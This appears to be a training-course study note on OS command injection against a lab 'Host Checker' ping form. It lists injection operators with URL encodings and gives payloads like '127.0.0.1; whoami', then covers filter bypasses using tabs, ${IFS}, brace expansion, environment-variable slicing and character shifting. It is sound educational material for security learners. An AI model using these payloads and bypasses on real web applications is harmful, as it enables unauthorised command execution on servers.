- [Command Injections](#command-injections)
  - [Detection](#detection)
    - [Command Injection Detection](#command-injection-detection)
    - [Command Injection Methods](#command-injection-methods)
  - [Injecting Commands](#injecting-commands)
    - [Injecting your Command](#injecting-your-command)
    - [Bypassing Front-End Validation](#bypassing-front-end-validation)
  - [Other Injection Operators](#other-injection-operators)
    - [AND Operator](#and-operator)
    - [OR Operator](#or-operator)
  - [Identifying Filters](#identifying-filters)
    - [Filter/WAF Detection](#filterwaf-detection)
    - [Blacklisted Characters](#blacklisted-characters)
      - [Identifying Blacklisted Character](#identifying-blacklisted-character)
  - [Bypassing Space Filters](#bypassing-space-filters)
    - [Using Tabs](#using-tabs)
    - [Using $IFS](#using-ifs)
    - [Using Brace Expansion](#using-brace-expansion)
  - [Bypassing Other Blacklisted Characters](#bypassing-other-blacklisted-characters)
    - [Linux](#linux)
    - [Windows](#windows)
    - [Character Shifting](#character-shifting)

---

# Command Injections

When it comes to OS Command Injections, the user input you control must directly or indirectly go into a web query that executes system commands. All web programming languages have different functions that enable the developer to execute operating system commands directly on the back-end server whenever they need to. This may be used for various purposes, like installing plugins or executing certain plugins.

## Detection

### Command Injection Detection

When you visit the web application, you see a "Host Checker" utility that appears to ask you for an IP to check whether it is alive or not.

![Host Checker](../../../images/command_injection1.png)

You can try entering the localhost IP ```127.0.0.1``` to check the functionality, and it returns the output of the ```ping``` command telling you that the localhost is alive.

![Localhost alive](../../../images/command_injection2.png)

You can confidently guess that the IP you entered is going into a ```ping``` command since the output you receive suggests that. The command used may be:

```bash
ping -c 1 OUR_INPUT
```

If your code is not sanitized and escaped before it is used with the ```ping``` command, you may be able to inject another arbitrary command.

### Command Injection Methods

To inject an additional command to the intended one:

| Injection Operator | Injection Character | URL-Encoded Character | Executed Command |
| ------------------ | ------------------- | --------------------- | ---------------- |
| Semicolon | ```;``` | %3b | Both |
| New Line | ```\n``` | %0a | Both |
| Background | ```&``` | %26 | Both (_second output generally shown first_) |
| Pipe | ``` \| ``` | %7c | Both (_only second output is shown_) |
| AND | ```&&``` | %26%26 | Both (_only if first succeeds_) |
| OR | ``` \|\| ``` | %7c%7c | Second (_only if first fails_) |
| Sub-Shell | ``` `` ``` | %60%60 | Both (_Linux-only_) |
| Sub-Shell | ```$()``` | %24%28%29 | Both (_Linux-only_) |

You can use any of these operators to inject another command so both or either of the commands get executed. You would

1. write your expected input,
2. use any of these above operators, and then
3. write your new command.

## Injecting Commands

### Injecting your Command

You can add a semi-colon after you IP and then append your command, such that the final payload you will use is ```127.0.0.1; whoami```, and the final command to be executed would be:

```bash
ping -c 1 127.0.0.1; whoami
```

> [!NOTE]
> A potential error can be user input validation happening on the front-end.

### Bypassing Front-End Validation

The easiest method to customize the HTTP requests being sent to the back-end server is to use a web proxy that can intercept the HTTP requests being sent by the application.

![Burp](../../../images/command_injection3.png)

## Other Injection Operators

### AND Operator

You can start with the AND (_&&_) operator, such that your final payload would be ```127.0.0.1 && whoami```, and the final executed command would be:

```bash
ping -c 1 127.0.0.1 && whoami
```

The command runs, and you get the same output (_ping-statistics and www-data_).

### OR Operator

The OR operator only executes the second command if the first command fails to execute. This may be useful in cases where your injection would break the original command without having a solid way of having both commands work.

```bash
21y4d@htb[/htb]$ ping -c 1 127.0.0.1 || whoami

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.635 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.635/0.635/0.635/0.000 ms
```

Only the first command would execute. This is because of how bash commands work. As the first command returns exit code ```0``` indicating successful execution, the bash command stops and does not try the other command. It would only attempt to execute the other command if the first command failed and returned an exit code ```1```.

By intentionally breaking the first command by not supplying an IP directly using the ```\|\|``` operator, such that the ping command would fail and your injected command gets executed.

```bash
21y4d@htb[/htb]$ ping -c 1 || whoami

ping: usage error: Destination address required
21y4d
```

## Identifying Filters

### Filter/WAF Detection

![Filter](../../../images/command_injection4.png)

This indicates that something you sent triggered a security mechanism in place that denied your request. This error message can be displayed in various ways. In this case, you see it in the field where the output is displayed, meaning that is was detected and prevented by the PHP web application itself. If the error message displayed a different page, with information like your IP and your request, this may indicate that it was denied by a WAF.

### Blacklisted Characters

A web application may have a list of blacklisted characters, and if the command contains them, it would deny the request. The PHP code may look something like this:

```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

If any character in the string you sent matches a character in the blacklist, your request is denied.

#### Identifying Blacklisted Character

One way to identify a blackliste character is to just reduce the command part by part. If you can clearly say, that it's the injection operator which is blacklisted, you should start trying other operators

![blacklist](../../../images/command_injection5.png)

> [!NOTE]
> The new-line character is usually not blacklisted, as it may be needed in the payload itseld. It in appending your commands both in Linux and Windows.

## Bypassing Space Filters

A space is a common blacklisted character, especially if the input should not contain any spaces, like an IP. Still, there are many ways to add a space character without actually using the space character.

![Space filter](../../../images/command_injection6.png)

### Using Tabs

Using Tabs (_%09_) instead of spaces is a technique that may work, as both Linux and Windows accept commands with tabs between arguments, and they are executed the same.

![tab](../../../images/command_injection7.png)

### Using $IFS

> [!NOTE]
> "The special shell variable _IFS_ determines how Bash recognizes word boundaries while splitting a sequence of character strings."

Using the (\$IFS) Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments. So, if you use ```${IFS}``` where the spaces should be, the variable should be automatically replaced with a space, and your command should work.

![ifs](../../../images/command_injection8.png)

### Using Brace Expansion

... which automatically adds spaces between arguments wrapped between braces.

Payload example:

```bash
127.0.0.1%0a{ls,-la}
```

Bash example:

```bash
d41y@htb[/htb]$ {ls,-la}

total 0
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 07:37 .
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 13:01 ..
```

## Bypassing Other Blacklisted Characters

A very commonly blacklisted character is the slash (```/```) or backslash (```\```) character, as it is necessary to specify directories in Linux or Windows.

### Linux

One technique you can use for replacing slashes is through Linux Environment Variables. While ```${IFS}``` is directly replaced with a space, there's no such environment variable for slashes or semi-colons. However, these characters may be used in an environment variable, and you can specify start and length of your string to exactly match this character.

```bash
d41y@htb[/htb]$ echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games

...

d41y@htb[/htb]$ echo ${PATH:0:1}

/

...

d41y@htb[/htb]$ echo ${LS_COLORS:10:1}

;
```

![env](../../../images/command_injection9.png)

### Windows

The same concept works on Windows as well. To produce a slash in CMD, you can echo a Windows variable (e.g. ```%HOMEPATH%```), and then specify a starting position, and finally specifying a negative end position.

For ```%HOMEPATH%``` -> ```\User\htb-student```:

```cmd
C:\htb> echo %HOMEPATH:~6,-11%

\
```

It also works on Powershell using the same variables. With Powershell, a word is considered an array, so you have to specify the index of the character you need. As you only need one character, you don't have to specify the start and end positions:

```powershell
PS C:\htb> $env:HOMEPATH[0]

\


PS C:\htb> $env:PROGRAMFILES[10]
PS C:\htb>
```

> [!NOTE]
> Use ```Get-ChildItem Env:``` to print all environment variables and then pick one of them to produce a character you need.

### Character Shifting

The following Linux command shifts the character you pass by 1. So, all you have to do is find the character in the ASCII table that is just before your needed character (_```man ascii``` to get the position_), then add it instead of ```[``` in the below example.

```bash
d41y@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
d41y@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)

\
```
